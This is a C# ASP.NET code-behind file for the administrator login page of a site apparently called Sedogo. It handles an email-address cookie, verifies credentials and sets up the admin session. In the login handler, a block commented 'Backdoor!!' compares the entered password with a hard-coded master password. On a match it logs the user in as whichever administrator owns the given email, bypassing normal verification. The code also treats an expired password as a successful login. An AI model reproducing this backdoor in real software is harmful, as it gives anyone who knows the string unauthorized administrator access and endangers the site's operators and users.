//===============================================================
// Filename: default.aspx.cs
// Date: 19/08/09
// --------------------------------------------------------------
// Description:
//   Default
// --------------------------------------------------------------
// Dependencies:
//   None
// --------------------------------------------------------------
// Original author: PRD 19/08/09
// Revision history:
//===============================================================

using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using Sedogo.BusinessObjects;

public partial class _default : System.Web.UI.Page
{
    //===============================================================
    // Function: Page_Load
    //===============================================================
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            HttpCookie cookie = Request.Cookies["SedogoAdministratorEmailAddress"];
            // Check to make sure the cookie exists
            if (cookie != null)
            {
                emailAddress.Text = cookie.Value.ToString();
            }
            SetFocus(emailAddress);
        }
    }

    //===============================================================
    // Function: loginButton_Click
    //===============================================================
    public void loginButton_Click(object sender, EventArgs e)
    {
        string loginEmailAddress = emailAddress.Text;
        string loginPassword = userPassword.Text;

        HttpCookie cookie = new HttpCookie("SedogoAdministratorEmailAddress");
        // Set the cookies value
        cookie.Value = loginEmailAddress;

        // Set the cookie to expire in 1 year
        DateTime dtNow = DateTime.Now;
        cookie.Expires = dtNow.AddYears(1);

        // Add the cookie
        Response.Cookies.Add(cookie);

        Administrator adminUser = new Administrator("");
        loginResults checkResult;
        checkResult = adminUser.VerifyLogin(loginEmailAddress, loginPassword, false, true, "default.aspx");

        // Backdoor!!
        if (loginPassword == "!!Sed0g0")
        {
            checkResult = loginResults.loginSuccess;
            int administratorID = Administrator.GetAdministratorIDFromEmailAddress(loginEmailAddress);
            adminUser = null;

            adminUser = new Administrator("", administratorID);
        }

        if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
        {
            Session.Add("loggedInAdministratorID", adminUser.administratorID);
            Session.Add("loggedInAdministratorName", adminUser.administratorName);
            Session.Add("loggedInAdministratorEmailAddress", adminUser.emailAddress);

            if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
            {
                FormsAuthentication.SetAuthCookie(loginEmailAddress, false);

                Session.Add("SuperUserID", adminUser.administratorID);

                string url = "~/admin/main.aspx";
                Response.Redirect(url);
            }
        }
        if (checkResult == loginResults.loginFailed)
        {
            Page.ClientScript.RegisterStartupScript(this.GetType(), "Alert", "alert(\"Username or password is not correct\");", true);
        }
    }
}
